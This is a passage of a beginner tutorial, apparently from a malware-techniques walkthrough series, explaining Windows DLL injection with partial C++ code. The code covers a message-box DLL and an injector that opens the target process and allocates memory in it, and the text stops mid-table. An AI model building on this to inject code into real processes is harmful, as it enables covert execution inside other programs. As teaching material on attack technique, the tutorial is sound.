Hello guys, Lets begin with the first malware technique which isss DLL Injection. If you didn't check the plan of our walkthrough go to it : [Introduction](link.com)

So if it's the first time that you encounter the term DLL, here is a small definition. 

## what is a DLL ?

A DLL or Dynamic Link Libraries is a modules that contain functions and data that can be used by another module (process or DLL).

You didn't understand huh, I'll give you an example, Imagine a process like notepad.


Notepad, as a simple text editor, relies on several standard Windows DLLs. Here are some of the common ones you might see:

```kernel32.dll```: It's an important one that we will encounter many times, It provides core operating system functionalities, such as memory management, input/output operations, and process and thread creation.

```user32.dll```: It contains functions for handling user interface components like windows, menus, and user input.

```gdi32.dll```: This one handles graphics device interface (GDI) functions for drawing graphics and text.

There is a lot of DLLs that Notepad uses.     

Note that multiple applications can share the same DLL in memory, reducing the overall memory footprint. This is especially beneficial for common libraries like the Windows API.

## What is DLL Injection ?

Here is a simple definition:

DLL injection is a technique used to execute code within the address space of another process by forcing it to load a dynamic link library (DLL).

## How DLL Injection Works ?

DLL injection typically involves 4 important steps:

- **Attaching to the Target Process**

The injector program attaches to the target process. This can be done using functions like OpenProcess, which opens a handle to the target process.

- **Allocating Memory in the Target Process**

The injector allocates memory within the target processâ€™s address space to store the path of the DLL to be injected. This is often done using the VirtualAllocEx function.

- **Writing the DLL Path into the Allocated Memory**

The path of the DLL to be injected is written into the allocated memory in the target process using the WriteProcessMemory function.

- **Loading the DLL into the Target Process** 

The injector creates a remote thread in the target process that executes the LoadLibrary function, which loads the DLL into the process. This can be done using the CreateRemoteThread function or other similar functions like NtCreateThreadEx.

Let's break these steps to c++ code with clarifying the Windows APIs that we'll use.

So starting by create our malicious DLL that contain a function, this function raise a message box that says " you've been hacked by Sn4ke Ey3s ".

```cpp
// InjectedDLL.cpp
#include <windows.h>

extern "C" __declspec(dllexport) void InjectedFunction() {
    MessageBoxA(NULL, "DLL Injected Successfully!", "Success", MB_OK);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        InjectedFunction();
    }
    return TRUE;
}
```

It's time to take some notes, The DllMain function is the entry point for a DLL (Dynamic-Link Library) in Windows. It is called by the operating system when the DLL is loaded or unloaded, or when certain events occur.

So the logic of DLL injection begins to appear clearly, when we will inject our DLL into the legitimate process ( ex:notepad ), our DLL will automatically load the DLLmain to execute what's inside it (malicious things).


After we create our DLL structure, now we should compile the DLL code to DLL file.
We can do this by executing this code

```bash
cl /LD InjectedDLL.cpp /link /out:InjectedDLL.dll
```

Moving know to attaching the target process and the way to do that is to open a handle to it.

Note that a handle is an abstract reference used by the Windows operating system to access and manage processes. It acts as an identifier that allows a program to perform various operations on a process, such as reading or writing memory, modifying process attributes, and interacting with its threads.

So the way to do that is by using the windows API function OpenProcess() in our Injector.cpp code

```cpp
// Injector.cpp
#include <windows.h>
#include <iostream>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "OpenProcess failed!" << std::endl;
        return;
    }
}
```

As we see the OpenProcess() API function take several args, here are all of them :
 
```cpp 
HANDLE OpenProcess(
  DWORD dwDesiredAccess,  // The access rights requested for the process
  BOOL bInheritHandle,    // Indicates whether the handle is inheritable
  DWORD dwProcessId       // The identifier of the process to be opened
);
```

| Argument         | Type   | Description                                                                                           |
|------------------|--------|-------------------------------------------------------------------------------------------------------|
| dwDesiredAccess  | DWORD  | Specifies the access rights requested for the process. This parameter can be a combination of one or more of the following access rights: |
|                  |        | - **PROCESS_ALL_ACCESS**: All possible access rights for a process object.                             |
|                  |        | - **PROCESS_CREATE_PROCESS**: Required to create a process.                                            |
|                  |        | - **PROCESS_CREATE_THREAD**: Required to create a thread.                                              |
|                  |        | - **PROCESS_DUP_HANDLE**: Required to duplicate a handle.                                              |
|                  |        | - **PROCESS_QUERY_INFORMATION**: Required to retrieve certain information about a process, such as its token, exit code, and priority class. |
|                  |        | - **PROCESS_QUERY_LIMITED_INFORMATION**: Required to retrieve certain information about a process (available from Windows Vista). |
|                  |        | - **PROCESS_SET_INFORMATION**: Required to set certain information about a process, such as its priority class. |
|                  |        | - **PROCESS_SET_QUOTA**: Required to set memory limits.                                                |
|                  |        | - **PROCESS_SUSPEND_RESUME**: Required to suspend or resume a process.                                 |
|                  |        | - **PROCESS_TERMINATE**: Required to terminate a process.                                              |
|                  |        | - **PROCESS_VM_OPERATION**: Required to perform an operation on the address space of a process (e.g., VirtualAllocEx and VirtualFreeEx). |
|                  |        | - **PROCESS_VM_READ**: Required to read memory in a process using ReadProcessMemory.                   |
|                  |        | - **PROCESS_VM_WRITE**: Required to write to memory in a process using WriteProcessMemory.             |
| bInheritHandle   | BOOL   | Specifies whether the returned handle is inheritable by child processes. If this parameter is **TRUE**, the handle is inheritable. If **FALSE**, the handle is not inheritable. |
| dwProcessId      | DWORD  | Specifies the identifier of the process to be opened. This is the process ID (PID) of the target process. |


In our implementation we'll focus on the 1st and 3rd parameters which are the desiredAccec and the PID of the target process.

The third step consists of Allocating some memory in the target process in order to take the path of our malicious DLL. We can achieve that by the API function VirtualAlloc().

Updating our Injector code :

```cpp
// Injector.cpp
#include <windows.h>
#include <iostream>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "OpenProcess failed!" << std::endl;
        return;
    }

    // Allocate memory in the target process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return;
    }
}
```

The syntax of the API function :

```cpp
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

Every argument is described as follows :

| Argument           | Type      | Description                                                                                                           |

| flAllocationType   | DWORD     | The type of memory allocation. This parameter can contain one or more of the following values:                        |
|                    |           | - **MEM_COMMIT**: Allocates memory charges for the specified region of pages.                                         |
